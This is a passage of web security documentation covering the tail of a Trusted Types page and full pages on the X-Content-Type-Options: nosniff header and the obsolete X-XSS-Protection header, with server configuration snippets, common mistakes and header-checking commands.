- **Omitting `trusted-types`.** Without the allowlist, code can create a policy of any name, including a malicious one; name your policies explicitly.
- **Treating it as a CSP replacement.** It is a layer on top of a strict CSP and [Subresource Integrity](/spec/security/subresource-integrity/), not a substitute.
- **Going straight to enforcing.** Untested, it breaks legitimate DOM code; always start report-only.

## Verification

- `curl -sI https://example.com | grep -i content-security-policy` should show `require-trusted-types-for 'script'`.
- In DevTools, run `document.body.innerHTML = '<img src=x>'`; under enforcement it throws a `TypeError`.
- Wire violations to a [reporting endpoint](/spec/security/reporting-endpoints/) and watch for `trusted-types-sink-violation` reports before and after you tighten.
---

## x-content-type-options
Source: https://specification.website/spec/security/x-content-type-options/

---
title: "X-Content-Type-Options: nosniff"
category: security
status: required
url: https://specification.website/spec/security/x-content-type-options/
updated: "2026-05-29T09:13:20.000Z"
sources:
  - title: "MDN — X-Content-Type-Options"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options"
    publisher: "MDN"
  - title: "Fetch Standard — MIME type checks"
    url: "https://fetch.spec.whatwg.org/#x-content-type-options-header"
    publisher: "WHATWG"
  - title: "OWASP Secure Headers Project"
    url: "https://owasp.org/www-project-secure-headers/"
    publisher: "OWASP"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# X-Content-Type-Options: nosniff

> The nosniff header stops browsers from guessing a response's content type. It blocks a class of attacks where a benign-looking file is interpreted as script or stylesheet.

## What it is

`X-Content-Type-Options: nosniff` is a response header that tells the browser to trust the `Content-Type` you sent and not to guess. It takes exactly one value: `nosniff`.

```http
X-Content-Type-Options: nosniff
```

The Fetch Standard makes this behaviour normative: when `nosniff` is present, the browser blocks script and stylesheet responses whose declared MIME type does not match the request.

## Why it matters

Historically, browsers performed "MIME sniffing" — looking at the bytes of a response and second-guessing the server's `Content-Type`. That convenience was also an attack surface. An attacker who could upload a file to a user-content directory could craft something that looked like an image to the server but executed as JavaScript when included with `<script src=…>`. The same trick worked for stylesheets, fonts, and Flash.

`nosniff` shuts that door. A `text/plain` response is not treated as script. A `text/html` response is not loaded as a stylesheet. The header is small, costs nothing, and removes an entire category of "the upload form is also an XSS vector" bugs.

## How to implement

Send the header on every response. Most web servers and CDNs let you set it globally; there is no reason to be selective.

Nginx:

```
add_header X-Content-Type-Options "nosniff" always;
```

Apache:

```
Header always set X-Content-Type-Options "nosniff"
```

Express (Node.js) — Helmet sets it by default.

In a CDN or edge worker, add the header to every response. There is no separate "report-only" mode — it is enforce-only.

Pair `nosniff` with correct `Content-Type` headers on every response. The directive only helps if your server actually labels responses properly. JavaScript files must be served as `application/javascript` (or `text/javascript`), CSS as `text/css`, JSON as `application/json`, and so on.

## Common mistakes

- **Multiple values.** The header takes one token, `nosniff`. Anything else is ignored or rejected.
- **Sending the wrong `Content-Type`.** With `nosniff` on, mislabelling a script as `text/plain` breaks the page. Fix the label, not the header.
- **Skipping it on uploads or user-content subdomains.** Those are exactly the responses where it matters most.
- **Assuming a CDN sets it.** Many do not. Check the actual headers from production.

## Verification

- `curl -sI https://example.com | grep -i x-content-type-options` should print `X-Content-Type-Options: nosniff`.
- Run [securityheaders.com](https://securityheaders.com/) against the site and check the score.
- Try fetching a JSON or text endpoint with `<script src=…>`. The browser console should report a MIME-type mismatch and refuse to execute it.
- Audit your CDN, static host, and origin separately — each layer can strip or override headers.
---

## x-xss-protection
Source: https://specification.website/spec/security/x-xss-protection/

---
title: "X-XSS-Protection"
category: security
status: avoid
url: https://specification.website/spec/security/x-xss-protection/
updated: "2026-08-08T00:00:00.000Z"
sources:
  - title: "MDN — X-XSS-Protection"
    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-XSS-Protection"
    publisher: "MDN"
  - title: "W3C — Content Security Policy Level 3"
    url: "https://www.w3.org/TR/CSP3/"
    publisher: "W3C"
  - title: "OWASP — Cross Site Scripting Prevention Cheat Sheet"
    url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
    publisher: "OWASP"
source_repo: https://github.com/jdevalk/specification.website
licence: CC-BY-4.0
---

# X-XSS-Protection

> A dead header that roughly a third of major sites still send. No shipping browser reads it, it was never standardised, and the values people copy-paste were the dangerous ones. Stop sending it and rely on CSP.

## What it is

`X-XSS-Protection` was a response header that switched on a browser's built-in reflected-XSS filter — Internet Explorer's XSS Filter, and later Chrome's and Safari's XSS Auditor. The filter compared the request URL against the response body; when a chunk of the query string turned up inside the returned HTML as script, the browser assumed an attack and either stripped that chunk or refused to render the page at all.

```http
X-XSS-Protection: 0             # filter off
X-XSS-Protection: 1             # filter on, sanitise the page
X-XSS-Protection: 1; mode=block # filter on, refuse to render the page
```

Two things about it are widely misremembered.

**It is not a standard.** It appears in no WHATWG, W3C, or IETF document, and never did. It was a vendor feature with a `X-` name that spread by copy-paste through hardening guides.

**`1; mode=block` was the harmful setting, not the safe one.** That is the value nearly every "secure headers" snippet recommends, and it is backwards: the values that turned the filter *on* are the ones that introduced problems, and `0` — the value that reads like you are disabling security — was the defensible one. That inversion is why the header is worth a page rather than a shrug.

Today the argument is moot, because nothing implements it. Firefox never shipped the filter. Edge dropped it in version 17, Chrome in version 78, and Safari in 15.4. Any browser a visitor is realistically using ignores every value above.

## Why it matters

A filter that rewrites your response based on a URL an attacker controls is a mechanism the attacker can aim. Because the filter decided what to suppress by matching the request against the body, an attacker could put a *legitimate* fragment of your own page into the query string and have the browser remove it — turning a safe page unsafe. MDN's worked example is the classic shape: a page sets `productionMode = true` in one inline script and guards debug code on it in another. Feed the first script back through the query string, the filter removes it as a suspected injection, `productionMode` evaluates to `undefined`, and the debug branch runs. Nothing on the server changed. The same selective-suppression trick was extended into cross-origin side channels, using the filter's block behaviour as an oracle for whether a given string appeared in a page the attacker could not otherwise read. That is what got the auditors removed: they cost more than they caught.

Now that no browser reads the header, the harm has changed shape rather than disappeared. Mark Nottingham's [survey of 120 million HTTP responses](https://mnot.net/blog/2026/linting_the_web) found `X-XSS-Protection` on 29% of the Tranco top 100,000 — within a few points of the 32% that send a Content-Security-Policy, which is the defence that actually replaces it. Its persistence is the point: it is the header nobody has to think about, so it stays in the config forever, and it keeps scoring points on security-header scanners that grade on presence rather than effect. A team can read a green report, believe reflected XSS is handled, and have shipped nothing that stops it.

## How to implement

Delete the header.

Removing it entirely is better than setting `X-XSS-Protection: 0`. The zero value existed to switch off a filter that no longer exists; sending it now just documents that you once had to think about this. If a compliance checklist insists the header be present with a specific value, `0` is the only value to give it — never `1` or `1; mode=block`.

Then do the work the header was pretending to do. Reflected XSS is defeated by [a Content Security Policy](/spec/security/content-security-policy/) that does not allow `'unsafe-inline'` in `script-src`, so an injected `<script>` has no way to execute; by context-correct output encoding wherever request data reaches HTML; and, for DOM-based sinks, by [Trusted Types](/spec/security/trusted-types/). OWASP's Cross Site Scripting Prevention Cheat Sheet covers the encoding rules per context, and — telling in itself — does not mention `X-XSS-Protection` anywhere.

This site sends no `X-XSS-Protection` header; see [`public/_headers`](https://github.com/jdevalk/specification.website/blob/main/public/_headers), which sets a CSP with no `'unsafe-inline'` on `script-src` instead.

## Common mistakes

- **Reading the `X-` prefix as "same family as `X-Content-Type-Options`".** [`X-Content-Type-Options: nosniff`](/spec/security/x-content-type-options/) shares the naming accident and nothing else: it is specified in the WHATWG Fetch Standard, implemented everywhere, and required. Legacy-looking name, current header.
- **Copying a hardening snippet that sets `1; mode=block`.** Most published header bundles still do. Check the date on any guide that recommends it — it predates the removals.
- **Treating a scanner's green tick as coverage.** Tools that score on header presence cannot tell an inert header from a working defence. The question to ask about a security header is which shipping browser acts on it.
- **Leaving it in place "for old browsers".** The only engine that would act on it is Internet Explorer, and a site still serving IE has a longer list of problems than this one.

## Verification

- `curl -sI https://example.com | grep -i x-xss-protection` should return nothing.
- Check the whole chain, not just the origin: CDNs, WAFs, reverse proxies, and framework security middleware all inject this header by default in some configurations, so a clean origin config does not prove a clean response.
- Confirm the replacement actually landed: the response carries a `Content-Security-Policy` whose `script-src` has no `'unsafe-inline'`.
---

